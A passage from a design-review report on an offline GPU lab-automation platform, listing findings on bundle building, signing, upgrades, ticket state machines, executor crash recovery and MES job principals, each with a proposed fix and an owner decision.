What the documents say: The validation-executor image is annotated as carrying NVQual and MFT alongside fio/stress-ng/perftest. NVQual is partner-licensed and MFT's EULA restricts redistribution, so the bundle cannot ship them to customers. Moreover all five tools exercise the GPUs, NICs, disks and CPUs of the target, while §12 gives the executor container no GPU or device and INV-4 forbids touching the platform host — the comment places target-side tools in the platform container, where they could test nothing or the wrong machine.

Why it matters: A redistribution blocker and an architectural fork (baked-in vs customer-supplied drop-in pushed to the target vs run only what the target already has) that changes the executor image, plan primitives, `slas doctor` and the New validation run wizard.

Fix: §12/§13: the validation-executor image ships OSS clients only; vendor and stress tools run on the target via `inband` — preinstalled on the target by the customer (recommended default) or pushed per run from a customer-supplied, read-only ${SLAS_DATA_ROOT}/Validation/Tools/<vendor>/ directory that is never part of the bundle. The plan compiler marks primitives whose tool is absent on the target 'unavailable' with a sentence at compile time; `slas doctor` and the wizard list missing tools. Record in an ADR with the EULA references.

Owner decision: Run on target with tools preinstalled by the customer (recommended); drop-in directory pushed per run; a redistribution agreement with NVIDIA.

Invariants: INV-4

Traceability: lenses fresh-supply-chain; ids fresh-bundle#12

### M3. INV-8 'builds succeed with networking disabled' has no mechanism or done-when: no lockfiles, mirror, base-image digests or offline build job
Where: `CLAUDE.md:102`, `docs/PROMPTS.md:46-47`, `docs/DEVELOPMENT_PLAN.md:32-34`, `CLAUDE.md:689`, `CLAUDE.md:693`, `docs/DEVELOPMENT_PLAN.md:33`
Also raised as: No pin-lint is named for INV-8; the only check is an egress-DROP job that a cached build passes

What the documents say: The only egress-DROP jobs defined run tests (P0) and install (P1); neither builds an image. Nothing says how about twenty images and the toolchains are built offline — committed lockfiles (uv.lock, pnpm-lock.yaml, Cargo.lock), a vendored wheel/npm/apt/cargo/go mirror, FROM lines pinned by digest, or a build-time egress-DROP job — and whether 'builds' in INV-8 means `docker build` of every image or only the Python/TypeScript packages is undefined.

Why it matters: INV-8 is a release blocker with no test; images will be built with network in CI and the clause will be found broken at the first offline rebuild, when a mirror is hardest to assemble.

Fix: P0/P1: every Dockerfile `FROM <image>@sha256:…`; uv.lock, pnpm-lock.yaml, Cargo.lock committed and checked (`uv lock --check`, `pnpm install --frozen-lockfile`); a build mirror (vendored wheels/npm/apt/cargo/go under build/mirror/, or devpi/verdaccio/aptly containers) populated once with network; CI `make images` runs with egress dropped except to the mirror — define 'networking disabled' in INV-8 as exactly that firewall state, or as `--network none` with the mirror bind-mounted. P1 done-when: 'all images and toolchains build under egress-DROP from committed lockfiles and the mirror'.

Owner decision: Vendored directories in an artifact store (simplest, large) vs mirror containers as build-time dependencies (new dependencies, ADR). Recommended default: vendored lockfile-driven mirrors for Python/Node, digest-pinned base images, aptly snapshot for OS packages.

Invariants: INV-8

Traceability: lenses fresh-supply-chain, invariant-enforcement; ids fresh-bundle#15, invariant-enforcement#19

### M4. install.sh calls `slas doctor` first, but the slas CLI is a Python package and the fresh host has no Python or network
Where: `CLAUDE.md:127`, `CLAUDE.md:779-780`, `CLAUDE.md:666`, `docs/DEVELOPMENT_PLAN.md:33-37`

What the documents say: The first install step runs `slas doctor`, but slas lives in packages/slas-cli as Python 3.12 code and the host is 'fresh' with no interpreter of the right version and no network to obtain one or its wheels (INV-1). Whether the CLI ships as a self-contained executable, as a bundled portable Python, or whether install.sh does preflight in shell and `slas` later runs inside a container, is undecided and changes P0's deliverable.

Why it matters: P0's done-when ('install.sh runs preflight and prints a plain-language report') cannot be satisfied on the INV-10 fresh VM without this decision; `slas doctor|status|logs|backup` must also work when the containers are down.

Fix: P0: 'slas ships as a self-contained executable at bundle/bin/slas (python-build-standalone + zipapp, or PyInstaller) that needs only glibc; install.sh checks sh and coreutils, then delegates preflight to it' — or 'install.sh preflight is POSIX sh; slas runs through the container engine after the engine check'. Record in §3 and in #4's bundle layout; add to P0 done-when: 'preflight runs on a VM with no Python installed'.

Owner decision: Self-contained CLI binary (recommended default: one code path for doctor before and after install; adds a build dependency, ADR) vs pure-sh preflight plus containerised CLI (no build dependency, but the engine check and the doctor report live in different code paths and `slas` is unusable when the engine is down).

Invariants: INV-1, INV-10

Traceability: lenses fresh-supply-chain; ids fresh-bundle#25

### M5. Host prerequisites for a 'fresh GPU host' are undefined, so it is unknown what the bundle must ship as OS packages
Where: `CLAUDE.md:104`, `CLAUDE.md:95`, `CLAUDE.md:121`, `docs/PROMPTS.md:59-60`

What the documents say: No document lists what the host already has versus what install.sh installs: supported distributions and versions, NVIDIA kernel driver floor (must match the CUDA runtime baked into the pinned vLLM image), nvidia-container-toolkit, the container engine and compose implementation, gVisor runsc ('if present' — nobody is named to install it), and an interpreter for the slas CLI. INV-1 forbids fetching packages, so anything not preinstalled must be in the bundle as per-distro OS packages, which changes bundle contents, install.sh and the CI fresh-VM image.

Why it matters: INV-10 is untestable until the fresh-VM baseline is defined; a host-driver versus pinned-CUDA mismatch is the most common way an offline GPU install fails, and the bundle builder (#4) cannot be written without knowing which OS packages to include.

Fix: Add a §3 table (or docs/SUPPORTED_HOSTS.md): 'Host provides: distro X/Y at version N, NVIDIA driver ≥ M (matches CUDA <ver> in the pinned vLLM image), a non-root service user. Bundle provides: container engine per ADR-0003, compose, nvidia-container-toolkit, runsc, slas CLI, as per-distro packages under bundle/os/<distro>/'. `slas doctor` checks each with a three-part message. P1 done-when: 'the CI fresh VM is built from the documented prerequisites only'.

Owner decision: Which distros/versions to support (recommend one LTS server distro for P1, add others by ADR); NVIDIA driver as a host prerequisite installed with the OS (recommended — kernel-bound, and avoids redistributing the .run installer) vs shipped in the bundle (check NVIDIA driver licence redistribution terms).

Invariants: INV-1, INV-10

Traceability: lenses fresh-supply-chain; ids fresh-bundle#3

### M6. No phase produces slas-bundle.tgz, yet P1's INV-10 test and M1 depend on it
Where: `CLAUDE.md:114`, `docs/DEVELOPMENT_PLAN.md:40-42`, `docs/DEVELOPMENT_PLAN.md:168`, `CLAUDE.md:774`, `CLAUDE.md:785`, `CLAUDE.md:127-128`, `docs/DEVELOPMENT_PLAN.md:33-34`, `docs/DEVELOPMENT_PLAN.md:40-44`, `docs/DEVELOPMENT_PLAN.md:57-61`
Also raised as: install.sh beyond preflight (.env generation, image loading from the bundle, wait healthy, one-time admin password, copy models) is in no phase scope

What the documents say: §3 defers the bundle's 'full detail' to Phase 1, but P1's scope, the P1 prompt and §13 contain no bundle builder, layout (images/, models/, toolchains/, os packages, compose/, config/, install.sh, manifest), version scheme or output name. The INV-10 fresh-VM test and milestone M1 both need a bundle to copy onto the VM.

Why it matters: A missing deliverable on P1's critical path, and every later phase that adds an image, model, toolchain or installer has nowhere to register it.

Fix: Add to §13 `bundle/{LAYOUT.md, build-bundle.sh}` and to P1 scope: 'bundle builder producing slas-bundle-<version>/ (name per fresh-bundle#21) with MANIFEST.json {version, built_at, git_sha, images[] (incl. the vLLM image, #18), models[], toolchains[] (#16), os_packages[] (#3), station_runner[] (#20), sha256 per file}'. P1 done-when: 'CI builds the bundle, copies it to the fresh VM, and install.sh reaches the login page under egress-DROP'. Resolve the dangling reference at §3 line 114 by pointing at bundle/LAYOUT.md.

Invariants: INV-10, INV-8

Traceability: lenses fresh-cross-document-and-plan, fresh-supply-chain; ids fresh-bundle#4, fresh-plan#11

### M7. No integrity verification of the bundle in quickstart: no manifest, no signature, no key delivery; cosign appears only in P12
Where: `CLAUDE.md:127-128`, `CLAUDE.md:102`, `docs/DEVELOPMENT_PLAN.md:159`, `docs/PROMPTS.md:210`, `CLAUDE.md:133`

What the documents say: The bundle is the only supply-chain entry into an air-gapped site, but the quickstart install sequence has no verification step, `slas doctor` and `slas upgrade` define none, and signature verification is scheduled only for the prod profile in P12. Who signs releases, how the key is held and how the public key reaches the site (it cannot come from inside the same bundle) are undefined. If cosign is chosen it must be key-based and offline: keyless mode needs Fulcio/Rekor and a trusted clock, which INV-1 forbids.

Why it matters: With images loaded from tarballs (#1) nothing checks the INV-8 digest pin, so a tampered or corrupted bundle installs silently on every quickstart site — the profile the docs call the default.

Fix: P1 scope: MANIFEST.sha256 over every bundle file plus a detached signature; release public key fingerprint printed in the delivery note and pinned at ${SLAS_DATA_ROOT}/.slas-release-key on first install with the fingerprint shown for the operator to compare; install.sh and `slas upgrade` abort on any mismatch with a three-part message; `slas doctor` reports bundle version, signer fingerprint and verified-at. Keep P12's Harbor + cosign as the prod registry layer, but make bundle verification a P1 deliverable. P1 done-when: 'a bundle with one flipped byte is refused with a three-part message'.

Owner decision: ssh-keygen -Y sign/verify (OpenSSH is on every host, no new dependency) — recommended default; minisign (tiny, new dependency, ADR); cosign key-based with `--key` and offline flags (fits P12's registry story, heavier). Trust bootstrap: trust-on-first-install with fingerprint comparison vs out-of-band key file.

Invariants: INV-1, INV-10, INV-8

Traceability: lenses fresh-supply-chain; ids fresh-bundle#8

### M8. `slas upgrade` is named but never specified: no phase, no done-when, no delta format, migration order or platform rollback
Where: `CLAUDE.md:131-133`, `CLAUDE.md:555`, `CLAUDE.md:215`, `docs/DEVELOPMENT_PLAN.md:161-162`, `CLAUDE.md:127-128`, `CLAUDE.md:767-769`, `CLAUDE.md:102`, `docs/DEVELOPMENT_PLAN.md:159`
Also raised as: `slas upgrade` is named but the offline upgrade path (bundle manifest, migration ownership, digest swap, .env preservation, rollback) is unspecified

What the documents say: `slas upgrade` appears in the normative CLI list and nowhere else: input format (full or delta bundle), reuse of already-present weights, Alembic migration ownership and order across api/orchestrator/git-broker, service restart order, .env and SLAS_SECRET_KEY preservation, behaviour with running tickets, and rollback of the platform (only model rollback is defined) are all missing. No phase's done-when covers upgrading from the previous version.

Why it matters: Without an upgrade path a bug or CVE fix has no delivery route to an air-gapped site, and the first real upgrade will be improvised against live data. Every other CLI verb maps to a phase; this one does not.

Fix: Add a §3 paragraph and a scope item (skeleton in P1, hardened in P11): '`slas upgrade <bundle>`: verify signature (#8) → preflight (disk; drain or --force running tickets) → load images → skip models whose recorded hashes already verify → `alembic upgrade head` (apps/api owns the schema; other services read it) → recreate services in §12 start order → smoke test → keep the previous image set and .env for `slas upgrade --rollback`'. Done-when: 'install the previous release fixture, upgrade to the current bundle; users, tickets and settings intact; --rollback returns to the previous version'.

Invariants: INV-10, INV-8, INV-9

Traceability: lenses fresh-supply-chain, operability; ids fresh-bundle#9, operability#4

### M9. INV-10 requires a 'fresh GPU host' and CI enforcement, but §11 forbids tests needing hardware and P1's deploy test is a 'fresh VM'; no document says install.sh must succeed without a GPU
Where: `CLAUDE.md:104`, `CLAUDE.md:689-691`, `CLAUDE.md:127-128`, `docs/DEVELOPMENT_PLAN.md:42-44`

What the documents say: From P3 onward install.sh copies models and starts model-manager, which starts vLLM on GPUs; 'wait healthy' on a GPU-less CI VM either blocks or fails unless install.sh treats inference as optional. No document states that behaviour, what `slas doctor` reports, or whether CI has a GPU lane; INV-10 names a GPU host while §11's test rule and the plan's 'fresh VM' presume none.

Why it matters: Decides install.sh's failure semantics, the health gate, doctor's copy and the CI topology; plan-sequencing-and-coverage#1 already implies a nightly GPU lane for eval, but nothing ties INV-10 to it.

Fix: CLAUDE.md §2 line 104 → 'INV-10 `./install.sh` on a fresh host reaches a working login page with no manual steps; on a host without a usable GPU, inference is reported as "not available" in a sentence and every other service is healthy. CI enforces the GPU-less path on every PR; the GPU path runs on the nightly GPU runner and is a release checklist item.' docs/DEVELOPMENT_PLAN.md P1 done-when line 43: mirror; P3 done-when line 62-64: add 'install.sh on a GPU-less VM still reaches the login page and doctor names the missing GPU'.

Owner decision: A (recommended default): install.sh degrades gracefully without a GPU (inference marked unavailable, login page still reached); PR CI enforces this path, the nightly GPU runner enforces the GPU path. B: keep INV-10 GPU-only and provision a GPU CI runner from P1; then §11's 'no test needs real hardware' must carve out tests/deploy explicitly.

Invariants: INV-10

Traceability: lenses fresh-cross-document-and-plan; ids fresh-plan#12

### M10. P6 schedules the toolchain resolver and `slas toolchain add`, but no document defines where toolchains live, their manifest, or whether they are directories or image layers
Where: `CLAUDE.md:131-134`, `CLAUDE.md:613-617`, `CLAUDE.md:231-246`, `CLAUDE.md:784`, `CLAUDE.md:740`, `docs/DEVELOPMENT_PLAN.md:90-92`, `docs/DEVELOPMENT_PLAN.md:102-104`, `docs/PROMPTS.md:118-121`, `docs/ui-demo/slas-ui-demo.html:1161`, `CLAUDE.md:133-134`, `CLAUDE.md:614-615`, `CLAUDE.md:81`, `docs/PROMPTS.md:118`
Also raised as: Toolchain resolution has no versioned, hashed manifest, so 'records the choice on the ticket' is not reproducible after an upgrade; P6 done-when hardcodes 'Rust 1.80' as the newest bundled toolchain

What the documents say: §4.4 has no Toolchains/ entry, the sandbox-manager mounts only Coding/, §13 has one image per language with no per-version scheme, and neither the plan nor PROMPTS says how `slas toolchain add` imports a version offline or how the resolver enumerates installed versions with integrity checks.

Why it matters: Whether a toolchain is a bind-mounted directory with a manifest or an image layer decides how sandbox images are built, how `slas toolchain add` works on an air-gapped host without rebuilding images, what the wizard's 'resolved toolchain' sentence reads, and what the bundle contains; CLI, images and wizard implementers in P6 would otherwise diverge.

Fix: CLAUDE.md §4.4: add `Toolchains/<lang>/<version>/{manifest.yaml, sha256}` (read-only into every sandbox); §12 sandbox-manager volumes: add `${SLAS_DATA_ROOT}/Toolchains:/data/Toolchains:ro`; §3: '`slas toolchain add <archive>` verifies the archive hash against the signed bundle manifest and unpacks it there; `slas toolchain list` and the resolver read the same manifests'. DEVELOPMENT_PLAN.md P6 scope: name the layout; P6 done-when: add '`slas toolchain add` of a Rust 1.81 archive makes it appear in `slas toolchain list` and resolvable by a new task without rebuilding any image'.

Owner decision: (a) Recommended default: Toolchains/<lang>/<version>/ directories with manifest + sha256, bind-mounted read-only; thin per-language base images; `toolchain add` never rebuilds an image. (b) One image per language×version; `toolchain add` loads an image tarball and the resolver reads image labels; heavier bundles, but immutable and simpler PATH handling.

Invariants: INV-1, INV-8

Traceability: lenses fresh-supply-chain, plan-sequencing-and-coverage; ids plan-sequencing-and-coverage#9, fresh-bundle#16, fresh-bundle#17


### 3.7 Kernel lifecycle, ticket states and schemas

### M1. Ticket is created at INGEST (§5.1, §5.4, P2) but at the wizard's final 'Start task' in §9, §10.1 and the UI demo
Where: `CLAUDE.md:258`, `CLAUDE.md:350`, `CLAUDE.md:344`, `CLAUDE.md:599`, `CLAUDE.md:611`, `docs/DEVELOPMENT_PLAN.md:47-48`, `docs/ui-demo/slas-ui-demo.html:1178`, `docs/ui-demo/slas-ui-demo.html:1185`, `CLAUDE.md:256-258`, `CLAUDE.md:653`, `docs/ui-demo/slas-ui-demo.html:454`, `docs/ui-demo/slas-ui-demo.html:1230`, `docs/DEVELOPMENT_PLAN.md:93-94`
Also raised as: Ticket creation point disagrees: INGEST (automatic) vs the wizard's Start button; Ticket is created 'at ingest, always' in the kernel, but Coding creates it only after the user approves the breakdown at wizard step 3; When the ticket is created: §5.1 at INGEST, §9/§10.1 at Start task, demo says both

What the documents say: §5.1 orders the lifecycle INGEST → TICKET → PLAN (with approval inside PLAN) and §5.4 says tickets are created at ingest; the state list Open → Planned → Approved presumes the ticket exists while the plan is reviewed. §9 line 599, §10.1 line 611 and the UI demo (line 1178, 1185) create the ticket only after the user has edited and approved the breakdown. Both cannot be true: one needs a ticket that exists in Open/Planned during an unfinished wizard (and a state for an abandoned wizard, which the list lacks); the other needs a wizard draft that is not a ticket.

Why it matters: The ticket state machine (P2), the wizard API, the Tickets page filters and the journal's first entry all depend on when a ticket first exists; P2 is built before P6, so the kernel rule must be settled first.

Fix: Recommended: keep creation at ingest. CLAUDE.md §9 line 599: change '**Start task** (creates T-coding-…)' to '**Start task** (moves T-coding-… from Planned to Approved)'. CLAUDE.md §10.1 line 611: change to 'INGEST plan.md → ticket T-coding-n (Open) → task breakdown (schema) → user edits/approves → Planned → Approved'. CLAUDE.md §5.4 line 344: add a terminal state 'Cancelled' (wizard closed before Start, or user cancels; reaped after a TTL) so the list reads 'Open → Planned → Approved → Running → Analysing → Needs review → Done | Failed | Cancelled'. docs/ui-demo/slas-ui-demo.html line 1178: change 'A ticket is created now' to 'Ticket C-1188 is approved now'.

Owner decision: A (recommended default): ticket at ingest (upload/scan/MES trigger) + 'Cancelled' state; keeps §5.1/§5.4 and the MES-triggered Factory flow uniform. B: ticket at wizard finish; then §5.1 line 258 and §5.4 line 350 must say 'created when the user confirms the wizard, or immediately for MES-triggered jobs', and the kernel needs a pre-ticket Draft object that P2 must also persist.

Invariants: INV-6

Traceability: lenses cross-document, fresh-runtime-state, fresh-ui-and-ux, internal-consistency; ids cross-document#3, fresh-state#13, internal-consistency#14, fresh-ux#6

### M2. Ticket Service and RCA are placed in apps/api (no LLM) by §4.2/§11/§12/P2 while §5.1 and the DoD call tickets and RCA kernel-only; the weekly health-check prompt would flag the plan's own design as drift
Where: `CLAUDE.md:167`, `CLAUDE.md:284-285`, `CLAUDE.md:671`, `CLAUDE.md:695`, `CLAUDE.md:716`, `docs/DEVELOPMENT_PLAN.md:49`, `docs/PROMPTS.md:70-71`, `docs/PROMPTS.md:268-269`, `CLAUDE.md:166-167`, `CLAUDE.md:354`, `docs/DEVELOPMENT_PLAN.md:47-49`
Also raised as: Ticket Service (and RCA) sit in the API per §4.2/§12, but §5.1 makes tickets and RCA kernel-only and §11 gives the API no LLM

What the documents say: The API box in §4.2 owns 'create, state, RCA, export' for tickets, and §11 says apps/api has no LLM access — yet RCA drafts its cause with a model (§5.4 line 355), so RCA cannot live in the API as drawn. §5.1 and the Definition of done make tickets and RCA kernel code (orchestrator), while §11, §12, plan P2 and PROMPTS P2 put the ticket state machine in apps/api. The PROMPTS weekly health check (line 268-269) asks Claude to report any ticket implementation outside slas_kernel — which is exactly what P2 instructs it to build.

Why it matters: Two services cannot both own the ticket state machine; the implementer must decide who validates transitions, and the health-check prompt as written will report the intended design as a violation every week.

Fix: CLAUDE.md §4.2 line 167: replace 'TICKET SERVICE (create, state, RCA, export)' with 'TICKET STORE (persist · state transitions · approvals · exports)'. CLAUDE.md §5.1 after line 285: add 'Ticket persistence and its REST surface live in apps/api; slas_kernel (in the orchestrator) is the only writer, owns the transition rules (shared in slas_schemas), and runs RCA and SOP.' CLAUDE.md §11 line 671: '`apps/api` (authz, ticket store, approvals; no hardware, no LLM)'. docs/DEVELOPMENT_PLAN.md line 49: 'Ticket store in `apps/api` (persistence, REST, exports) with transition rules from `slas-schemas` enforced on write'. docs/PROMPTS.md line 70-71: 'Implement the ticket store in apps/api; the lifecycle logic stays in slas_kernel'. docs/PROMPTS.md line 268-269: append '(the ticket store in apps/api is the persistence layer, not a second implementation)'.

Traceability: lenses cross-document, internal-consistency; ids cross-document#4, internal-consistency#30

### M3. The Terminal is 'per project' in §9 but its sandbox, TTL and recording are defined per ticket
Where: `CLAUDE.md:588-590`, `CLAUDE.md:439`, `CLAUDE.md:233-234`, `CLAUDE.md:625-626`, `docs/ui-demo/slas-ui-demo.html:622`, `CLAUDE.md:341`, `CLAUDE.md:588-589`, `CLAUDE.md:234`, `docs/ui-demo/slas-ui-demo.html:454`, `docs/ui-demo/slas-ui-demo.html:583`
Also raised as: Terminal sessions are 'recorded to the ticket' but a terminal is per project, not per job/ticket; Coding page is per-ticket in the demo but §9 attaches the Git panel and Terminal to a project

What the documents say: Projects outlive tasks and §9 gives every project a Terminal tab, while §5.7, §10.1 and the demo bind the terminal, its sandbox, TTL and recording to a ticket; §4.4 keys the sandbox by a third term, <session>. A terminal opened when no ticket is open has no sandbox owner, quota or recording target.

Why it matters: The P6 implementer must choose between a sandbox outside the kernel (no journal, no quota), refusing the terminal, or minting a ticket; each changes apps/api, sandbox-manager and the Coding page.

Fix: Pick one lifetime. Recommended: §9 → "each project with an open task has a Terminal tab that runs inside that task's sandbox; after the ticket closes and its TTL expires, the terminal is unavailable until a new task starts" and §4.4 `Container/<ticket-id>/`. Alternative: "opening a terminal with no running task creates a `T-coding-<seq>` ticket of `kind: session` (no plan, RCA or SOP) that owns the sandbox, TTL, quota and recording" plus `kind: task|session` in §5.4.

Owner decision: (a) ticket-bound terminal, reword §9 — recommended default (no new concepts; matches §5.7, §10.1 and the demo); (b) session tickets — keeps §9's per-project promise at the cost of a new ticket kind.

Traceability: lenses fresh-data-lifecycle, fresh-ui-and-ux, internal-consistency; ids fresh-data#27, internal-consistency#48, fresh-ux#43

### M4. RCA runs concurrently with Running, and child tickets exist as drafts, but the state machine is linear and has no Draft
Where: `CLAUDE.md:344`, `CLAUDE.md:350-351`, `CLAUDE.md:356`, `CLAUDE.md:86-87`, `CLAUDE.md:660`, `docs/DEVELOPMENT_PLAN.md:123`, `docs/ui-demo/slas-ui-demo.html:783`, `docs/ui-demo/slas-ui-demo.html:801`

What the documents say: Child bug tickets are 'drafted' in §10.3, P7, P9, PROMPTS and the demo, and §1.3 forbids filing a ticket without a human, but §5.4's single state list starts at Open with no Draft, no 'File' transition and no Discard. Per-finding RCA runs while the parent is still Running, so 'Analysing' needs a definition (end-of-run pass vs per-finding).

Why it matters: The P2 ticket schema must represent a child that exists but is not yet filed; the P7 done-when ('bug ticket is drafted with 3 votes') and the demo's File/Keep-as-draft actions cannot be built on the state list as written.

Fix: §5.4: child tickets start in `Draft` with `Draft → Open` ('File ticket', records the filer) and `Draft → Discarded`; parent `findings[]` entries carry `rca {state: pending | voting | drafted | filed, votes[]}`. Define `Analysing` as the end-of-run pass after ACT; per-finding RCA runs concurrently under Running, consistent with 'never blocks the run'. Add the new states to `slas_ticket_state_changes_total`.

Traceability: lenses fresh-runtime-state; ids fresh-state#12

### M5. Aborted and Cancelled are missing as terminal states, and abort has no safe-point semantics
Where: `CLAUDE.md:344`, `CLAUDE.md:270`, `CLAUDE.md:640`, `docs/ui-demo/slas-ui-demo.html:415`, `docs/ui-demo/slas-ui-demo.html:717`, `docs/ui-demo/slas-ui-demo.html:747-748`, `docs/ui-demo/slas-ui-demo.html:707`, `CLAUDE.md:638-640`, `CLAUDE.md:683`, `docs/ui-demo/slas-ui-demo.html:230`, `docs/ui-demo/slas-ui-demo.html:714-716`, `docs/ui-demo/slas-ui-demo.html:455`, `docs/ui-demo/slas-ui-demo.html:869`, `docs/ui-demo/slas-ui-demo.html:748`
Also raised as: No Pausing/Paused state or hold point, although all three agents expose a pause control; Ticket state machine has no transition table: actor, Needs review, abort/cancel

What the documents say: §5.1 and §5.4 end only in Done | Failed. The demo has an operator Abort available in any step of a running cycle (kept logs, report still generated, lease released), a Cancel for approved-but-queued runs, and §10.2 has a guardrail abort. Whether these are `Failed` or distinct states, whether abort waits for the in-flight power step, and how the UI can promise 'the target stays powered on' are undefined.

Why it matters: An immediate abort during ACT(Redfish) leaves a server off with the lease released; without distinct states the Runs page, metrics and RCA cannot distinguish an operator abort or a queued cancel from a platform failure, and the P2 state machine cannot implement the demo's controls.

Fix: §5.4: add terminal `Cancelled` (from Open/Planned/Approved; nothing executed) and `Aborted {by: operator | guardrail}` (from Running/Pausing/Paused; the ticket still passes Analysing so the report is produced, as demo 747 promises). Executor abort rule: finish the in-flight step so the target is in a known state (a power_off is followed by the cycle's power_on), journal `target_power_state: on|off|unknown`, and word the abort dialog and result from that record instead of an unconditional promise. Reserve `Failed` for platform errors. Add to P7 done-when: 'Abort during ACT leaves the target on, the lease released, and a report attached.'

Invariants: INV-7

Traceability: lenses fresh-runtime-state, spec-ambiguity; ids fresh-state#2, fresh-state#1, spec-ambiguity#3

### M6. Executors mount no data volume, so nobody can write the write-ahead journal they are required to keep
Where: `CLAUDE.md:750-752`, `CLAUDE.md:753-755`, `CLAUDE.md:715-720`, `CLAUDE.md:238-239`, `CLAUDE.md:284-285`, `CLAUDE.md:672-677`, `docs/DEVELOPMENT_PLAN.md:118-119`

What the documents say: The journal is kernel code (orchestrator), the executor runs the cycle state machine 'with crash recovery', and the executor containers mount no data volume. Who durably writes `intent` before a power action and who reads the journal after `kill -9` is not decided; the two readings (executor-owned file journal vs orchestrator-driven RPC with a synchronous ack) produce different services.

Why it matters: P7's crash-recovery done-when depends on the executor (or orchestrator) reading its own journal after a restart; the blueprint is conceptual, but the ownership question shapes the executor/orchestrator boundary and the INV-6 write-ahead guarantee.

Fix: Decide in §5.1/§12 and P7 scope: (A) executors own the journal — mount `${SLAS_DATA_ROOT}/Validation` / `/Factory` (or `Tickets/`, see #30) rw, import the kernel journal module as a library, fsync the intent record before dispatch; orchestrator reads it; or (B) the orchestrator drives step by step, journals before each RPC, and the executor is stateless with recovery in the orchestrator. Add to P7 done-when: 'no power action is dispatched before its intent record is durable.'

Owner decision: A: executor-owned file journal on the data root (matches §4.4 paths and DEVELOPMENT_PLAN P7 'executor … crash recovery'; needs the volume). B: orchestrator-owned journal over RPC (matches §5.1 'journal is kernel code'; executor needs no volume; a network hop before every power action). Recommended: A, with the journal module shared from slas_kernel.

Invariants: INV-6

Traceability: lenses fresh-runtime-state; ids fresh-state#9

### M7. Kernel ACT is 'deterministic executor runs the Plan step by step' but the Coding Agent's ACT is a model-driven generate-edit loop the Agent protocol cannot express
Where: `CLAUDE.md:263`, `CLAUDE.md:279`, `CLAUDE.md:618-620`, `CLAUDE.md:262`, `CLAUDE.md:97`, `CLAUDE.md:618`, `CLAUDE.md:611`, `CLAUDE.md:276-282`, `CLAUDE.md:284-285`
Also raised as: §5.1 makes ACT a deterministic executor of a fixed Plan for all agents, but the Coding ACT loop has the model generating edits each iteration; Coding ACT loop puts the model inside the 'deterministic executor runs the Plan' lifecycle

What the documents say: For Coding the Plan is not a fixed list of whitelisted steps; each iteration calls a model to produce new edits. The Agent protocol has no hook for this (`plan()` is called once), and 'critical' as the trigger for plan-level consensus is not defined in §5.1.

Why it matters: The kernel must either expose an iterate() hook or model the loop as a kernel-owned step whose body calls the gateway and emits `files`/`run` primitives — a core-interface decision for Phase 2 that the SSOT leaves open.

Fix: In CLAUDE.md §5.1 (after line 281): add `def iterate(self, job: Job, state: LoopState) -> list[Step] | Done: ...` with the note 'kernel bounds by max_iterations and no-progress = 3; only Coding implements it; every returned Step is still executed by the deterministic executor'. At line 262 replace 'if plan is critical' with 'if §5.3 lists a plan-level cross-check for this agent (Validation, Factory)'.

Owner decision: A) add `iterate()` to the Agent protocol — recommended. B) keep the protocol and define a kernel step type `coding_iteration` whose body calls the gateway and emits files/run primitives; then §10.1 line 618 must say so.

Invariants: INV-11, INV-3

Traceability: lenses internal-consistency, invariant-enforcement, spec-ambiguity; ids internal-consistency#15, invariant-enforcement#8, spec-ambiguity#20

### M8. Executor crash mid-cycle: lease expiry, orphaned-intent handling and safe state for a target left powered off are undefined
Where: `CLAUDE.md:100`, `CLAUDE.md:166`, `CLAUDE.md:646-648`, `CLAUDE.md:660`, `CLAUDE.md:101`, `docs/DEVELOPMENT_PLAN.md:54`, `docs/DEVELOPMENT_PLAN.md:119`, `docs/DEVELOPMENT_PLAN.md:124`, `docs/ui-demo/slas-ui-demo.html:748`, `CLAUDE.md:263-264`, `docs/PROMPTS.md:71-72`, `CLAUDE.md:473`, `CLAUDE.md:496`, `docs/DEVELOPMENT_PLAN.md:53-54`, `CLAUDE.md:637-640`
Also raised as: Resume semantics between `intent` and `observation` are undefined; replaying a destructive step re-executes it; No document defines the resume rule for a step whose intent was journalled but whose observation was not; the P2 crash test covers only the completed-step case

What the documents say: Resume-from-journal after a crash is specified (P2, P7) and a manual abort releases the lease (demo), but nothing defines lease ownership, TTL or heartbeat when the executor never returns, what a restarted executor does with a journal whose last record is `intent` or `action` without `observation`, whether the target may be left powered off, how long a 'held' station stays held, or how an admin releases a lease. The reviewer's INV-7 point does not hold: approval is per-run, so resuming the same run is within its approval.

Why it matters: A target left `force_off` at 03:00 keeps its lease until someone edits the database, blocking the lab; or an auto-resume re-issues an ambiguous power step. Both are hardware-safety decisions an implementer of P7 must currently guess.

Fix: CLAUDE.md §5.1 add an 'ACT recovery' paragraph: 'Leases live in Postgres `{resource, ticket, holder, expires_at, heartbeat_at}`; executors heartbeat every 30 s; the API expires a lease after 3 missed heartbeats and sets the run to Needs review. On start an executor scans for `intent`/`action` records without `observation`; it never re-issues that step. It records `observation: unknown (executor restarted)`, reads the target power state with a `get_*` primitive, leaves the target as found, and tells the ticket owner in one sentence ("R7 was left powered off when the run stopped; power it on from the run page"). Continuing requires the owner to press Resume.' §10.2 guardrails add `lease_ttl_s 90` and §10.3 `station_hold_max_h 8`. §9 Runs page: 'Release lease' with capability `runs:lease_release`. DEVELOPMENT_PLAN P2/P7 done-when: add 'a journal ending in intent without observation is never re-executed and the run lands in Needs review'.

Owner decision: (a) After an ambiguous power step the run stops in Needs review and a human presses Resume — recommended default; (b) the executor resumes automatically after confirming the target power state matches the intent (faster, riskier on real hardware).

Invariants: INV-3, INV-6, INV-7

Traceability: lenses fresh-prompts-adr-gitignore, fresh-runtime-state, operability; ids operability#9, fresh-state#7, fresh-prompts#23


### 3.8 Lab and factory execution

### M1. An MES-triggered job has no logged-in user, yet ticket, skills and executor authz require a principal
Where: `CLAUDE.md:278`, `CLAUDE.md:345`, `CLAUDE.md:653`, `CLAUDE.md:678`, `CLAUDE.md:755`

What the documents say: Every ticket carries a `user`, skills run with a user's capabilities and authz is checked at the executor, but a job created from a file in the MES drop directory has no logged-in user; no document names the principal it runs as.

Why it matters: P9's done-when ('a fake MES ticket triggers a 9-step loop') forces the implementer to choose a principal; the easy choice is a service account holding every factory capability, which hollows out the capability model and INV-7's human approver for overrides.

Fix: Add to §10.3 TRIGGER: 'A job triggered by MES runs as the station's bound principal (`Station.owner_principal`, set by a line lead at enrolment; a real account holding `factory:start_job` and the template's skill capabilities, never `factory:override_verdict` or any INV-7 approval capability). `Ticket.user` is that principal; `Ticket.triggered_by` records `mes:<adapter>:<mes_ref>`, `scan:<user>` or `manual:<user>`.' Add `triggered_by` to the §5.4 field list.

